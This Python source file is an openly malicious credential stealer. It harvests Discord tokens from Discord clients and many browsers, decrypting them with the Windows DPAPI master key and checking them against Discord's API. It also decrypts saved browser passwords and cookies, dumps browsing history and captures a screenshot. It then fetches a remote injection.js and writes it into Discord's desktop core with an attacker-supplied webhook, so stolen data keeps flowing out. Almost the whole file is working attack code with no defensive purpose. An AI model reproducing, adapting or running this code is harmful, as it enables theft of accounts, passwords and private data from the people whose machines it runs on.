import os
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from json import loads
from base64 import b64decode
from sqlite3 import connect
from shutil import copy2
from PIL import ImageGrab
from threading import Thread
import subprocess
from re import search, findall
from requests import get
from sys import argv

# monkey
global all_tokens
all_tokens = []
appdata = os.getenv("LOCALAPPDATA")
roaming = os.getenv("APPDATA")
temp = os.getenv("TEMP")
encrypt_regex = r"dQw4w9WgXcQ:[^\"]*"
normal_regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
baseurl = "https://discord.com/api/v9/users/@me"
tokens = []
ids = []

paths = {
    "Discord": roaming + "\\discord\\Local Storage\\leveldb\\",
    "Discord Canary": roaming + "\\discordcanary\\Local Storage\\leveldb\\",
    "Lightcord": roaming + "\\Lightcord\\Local Storage\\leveldb\\",
    "Discord PTB": roaming + "\\discordptb\\Local Storage\\leveldb\\",
    "Opera": roaming + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\",
    "Opera GX": roaming + "\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\",
    "Amigo": appdata + "\\Amigo\\User Data\\Local Storage\\leveldb\\",
    "Torch": appdata + "\\Torch\\User Data\\Local Storage\\leveldb\\",
    "Kometa": appdata + "\\Kometa\\User Data\\Local Storage\\leveldb\\",
    "Orbitum": appdata + "\\Orbitum\\User Data\\Local Storage\\leveldb\\",
    "CentBrowser": appdata + "\\CentBrowser\\User Data\\Local Storage\\leveldb\\",
    "7Star": appdata + "\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\",
    "Sputnik": appdata + "\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\",
    "Vivaldi": appdata + "\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\",
    "Chrome SxS": appdata + "\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\",
    "Chrome": appdata
    + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\",
    "Chrome1": appdata
    + "\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\",
    "Chrome2": appdata
    + "\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\",
    "Chrome3": appdata
    + "\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\",
    "Chrome4": appdata
    + "\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\",
    "Chrome5": appdata
    + "\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\",
    "Epic Privacy Browser": appdata
    + "\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\",
    "Microsoft Edge": appdata
    + "\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\",
    "Uran": appdata + "\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\",
    "Yandex": appdata
    + "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\",
    "Brave": appdata
    + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\",
    "Iridium": appdata + "\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\",
}


def decrypt_val(buff, master_key):
    iv = buff[3:15]
    payload = buff[15:]
    cipher = AES.new(master_key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)
    decrypted_pass = decrypted_pass[:-16].decode()

    return decrypted_pass


def get_key(path):
    if not os.path.exists(path):
        return

    if "os_crypt" not in open(path, "r", encoding="utf-8").read():
        return

    with open(path, "r", encoding="utf-8") as f:
        c = f.read()

    local_state = loads(c)
    master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]
    master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
    # ngl I stole all this from addidix cause im too lazy to remake it since my shit broken af
    return master_key


for name, path in paths.items():
    if not os.path.exists(path):
        continue
    disc = name.replace(" ", "").lower()
    if "cord" in path:
        if os.path.exists(roaming + f"\\{disc}\\Local State"):
            for file_name in os.listdir(path):
                if file_name[-3:] not in ["log", "ldb"]:
                    continue
                for line in [
                    x.strip()
                    for x in open(f"{path}\\{file_name}", errors="ignore").readlines()
                    if x.strip()
                ]:
                    for y in findall(encrypt_regex, line):
                        try:
                            token = decrypt_val(
                                b64decode(y.split("dQw4w9WgXcQ:")[1]),
                                get_key(roaming + f"\\{disc}\\Local State"),
                            )
                        except:
                            token = "ERROR"
                        r = get(
                            baseurl,
                            headers={
                                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
                                "Content-Type": "application/json",
                                "Authorization": token,
                            },
                        )
                        if r.status_code == 200:
                            uid = r.json()["id"]
                            if uid not in ids:
                                tokens.append(token)
                                ids.append(uid)
    else:
        for file_name in os.listdir(path):
            if file_name[-3:] not in ["log", "ldb"]:
                continue
            for line in [
                x.strip()
                for x in open(f"{path}\\{file_name}", errors="ignore").readlines()
                if x.strip()
            ]:
                for token in findall(normal_regex, line):
                    r = get(
                        baseurl,
                        headers={
                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
                            "Content-Type": "application/json",
                            "Authorization": token,
                        },
                    )
                    if r.status_code == 200:
                        uid = r.json()["id"]
                        if uid not in ids:
                            tokens.append(token)
                            ids.append(uid)

if os.path.exists(roaming + "\\Mozilla\\Firefox\\Profiles"):
    for path, _, files in os.walk(roaming + "\\Mozilla\\Firefox\\Profiles"):
        for _file in files:
            if not _file.endswith(".sqlite"):
                continue
            for line in [
                x.strip()
                for x in open(f"{path}\\{_file}", errors="ignore").readlines()
                if x.strip()
            ]:
                for token in findall(normal_regex, line):
                    r = get(
                        baseurl,
                        headers={
                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
                            "Content-Type": "application/json",
                            "Authorization": token,
                        },
                    )
                    if r.status_code == 200:
                        uid = r.json()["id"]
                        if uid not in ids:
                            tokens.append(token)
                            ids.append(uid)

# ++++++++++++++++++ FULL CREDIT TO SMUG FOR EVERYTHING BELOW THIS https://github.com/Smug246/Luna-Token-Grabber +++++++++++++++++++++++


class browsers:
    def __init__(self) -> None:
        self.appdata = os.getenv("LOCALAPPDATA")
        self.browsers = {
            "amigo": self.appdata + "\\Amigo\\User Data",
            "torch": self.appdata + "\\Torch\\User Data",
            "kometa": self.appdata + "\\Kometa\\User Data",
            "orbitum": self.appdata + "\\Orbitum\\User Data",
            "cent-browser": self.appdata + "\\CentBrowser\\User Data",
            "7star": self.appdata + "\\7Star\\7Star\\User Data",
            "sputnik": self.appdata + "\\Sputnik\\Sputnik\\User Data",
            "vivaldi": self.appdata + "\\Vivaldi\\User Data",
            "google-chrome-sxs": self.appdata + "\\Google\\Chrome SxS\\User Data",
            "google-chrome": self.appdata + "\\Google\\Chrome\\User Data",
            "epic-privacy-browser": self.appdata + "\\Epic Privacy Browser\\User Data",
            "microsoft-edge": self.appdata + "\\Microsoft\\Edge\\User Data",
            "uran": self.appdata + "\\uCozMedia\\Uran\\User Data",
            "yandex": self.appdata + "\\Yandex\\YandexBrowser\\User Data",
            "brave": self.appdata + "\\BraveSoftware\\Brave-Browser\\User Data",
            "iridium": self.appdata + "\\Iridium\\User Data",
        }

        self.profiles = [
            "Default",
            "Profile 1",
            "Profile 2",
            "Profile 3",
            "Profile 4",
            "Profile 5",
        ]

        for name, path in self.browsers.items():
            if not os.path.isdir(path):
                continue

            self.masterkey = self.get_master_key(path + "\\Local State")
            self.funcs = [self.cookies, self.history, self.passwords]

            for profile in self.profiles:
                for func in self.funcs:
                    try:
                        func(name, path, profile)
                    except:
                        pass

    def get_master_key(self, path: str) -> str:
        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = loads(c)

        master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    def decrypt_password(self, buff: bytes, master_key: bytes) -> str:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass

    def passwords(self, name: str, path: str, profile: str) -> None:
        path += "\\" + profile + "\\Login Data"
        if not os.path.isfile(path):
            return
        copy2(path, "Loginvault.db")
        conn = connect("Loginvault.db")
        cursor = conn.cursor()
        with open(".\\browser-passwords.txt", "a+") as f:
            for res in cursor.execute(
                "SELECT origin_url, username_value, password_value FROM logins"
            ).fetchall():
                url, username, password = res
                password = self.decrypt_password(password, self.masterkey)
                if url and username and password != "":
                    f.write(
                        "Username: {:<40} Password: {:<40} URL: {}\n".format(
                            username, password, url
                        )
                    )
                else:
                    pass
        cursor.close()
        conn.close()
        os.remove("Loginvault.db")

    def cookies(self, name: str, path: str, profile: str) -> None:
        path += "\\" + profile + "\\Network\\Cookies"
        if not os.path.isfile(path):
            return
        copy2(path, "Cookievault.db")
        conn = connect("Cookievault.db")
        cursor = conn.cursor()
        with open(".\\browser-cookies.txt", "a+", encoding="utf-8") as f:
            for res in cursor.execute(
                "SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies"
            ).fetchall():
                host_key, name, path, encrypted_value, expires_utc = res
                value = self.decrypt_password(encrypted_value, self.masterkey)
                if host_key and name and value != "":
                    f.write(
                        "{}\t{}\t{}\t{}\t{}\t{}\t{}\n".format(
                            host_key,
                            "FALSE" if expires_utc == 0 else "TRUE",
                            path,
                            "FALSE" if host_key.startswith(".") else "TRUE",
                            expires_utc,
                            name,
                            value,
                        )
                    )
                else:
                    f.write("No cookies were found :(")
        cursor.close()
        conn.close()
        os.remove("Cookievault.db")

    def history(self, name: str, path: str, profile: str) -> None:
        path += "\\" + profile + "\\History"
        if not os.path.isfile(path):
            return
        copy2(path, "Historyvault.db")
        conn = connect("Historyvault.db")
        cursor = conn.cursor()
        with open(".\\browser-history.txt", "a+", encoding="utf-8") as f:
            sites = []
            for res in cursor.execute(
                "SELECT url, title, visit_count, last_visit_time FROM urls"
            ).fetchall():
                url, title, visit_count, last_visit_time = res
                if url and title and visit_count and last_visit_time != "":
                    sites.append((url, title, visit_count, last_visit_time))
            sites.sort(key=lambda x: x[3], reverse=True)
            for site in sites:
                f.write("Visit Count: {:<6} Title: {:<40}\n".format(site[2], site[1]))

        cursor.close()
        conn.close()
        os.remove("Historyvault.db")


def ss():
    ImageGrab.grab(
        bbox=None, include_layered_windows=False, all_screens=True, xdisplay=None
    ).save("desktop-screenshot.png")


class inject:
    def __init__(self, webhook: str):
        self.appdata = os.getenv("LOCALAPPDATA")
        self.discord_dirs = [
            self.appdata + "\\Discord",
            self.appdata + "\\DiscordCanary",
            self.appdata + "\\DiscordPTB",
            self.appdata + "\\DiscordDevelopment",
        ]
        self.code = get(
            "https://raw.githubusercontent.com/KDot227/Powershell-Token-Grabber/main/injection.js"
        ).text

        for dir in self.discord_dirs:
            if not os.path.exists(dir):
                continue

            if self.get_core(dir) is not None:
                with open(
                    self.get_core(dir)[0] + "\\index.js", "w", encoding="utf-8"
                ) as f:
                    f.write(
                        (self.code)
                        .replace("discord_desktop_core-1", self.get_core(dir)[1])
                        .replace("%WEBHOOK%", webhook)
                    )
                    self.start_discord(dir)

    def get_core(self, dir: str):
        for file in os.listdir(dir):
            if search(r"app-+?", file):
                modules = dir + "\\" + file + "\\modules"
                if not os.path.exists(modules):
                    continue
                for file in os.listdir(modules):
                    if search(r"discord_desktop_core-+?", file):
                        core = modules + "\\" + file + "\\" + "discord_desktop_core"
                        if not os.path.exists(core + "\\index.js"):
                            continue
                        return core, file

    def start_discord(self, dir: str):
        update = dir + "\\Update.exe"
        executable = dir.split("\\")[-1] + ".exe"

        for file in os.listdir(dir):
            if search(r"app-+?", file):
                app = dir + "\\" + file
                if os.path.exists(app + "\\" + "modules"):
                    for file in os.listdir(app):
                        if file == executable:
                            executable = app + "\\" + executable
                            subprocess.call(
                                [update, "--processStart", executable],
                                shell=True,
                                stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE,
                            )


# ++++++++++++++++++++++++++++ FULL CREDIT TO SMUG FOR EVERYTHING ABLOVE THIS LINE https://github.com/Smug246/Luna-Token-Grabber ++++++++++++++++++++++++++++

if __name__ == "__main__":
    webhook = argv[1]
    remove_dup = [*set(all_tokens)]
    with open("tokens.txt", "a+", encoding="utf-8", errors="ignore") as f:
        for item in tokens:
            f.write(f"{item}\n")
    threads = [browsers, ss]
    for thread in threads:
        t = Thread(target=thread, daemon=True)
        t.start()
    inject(webhook)
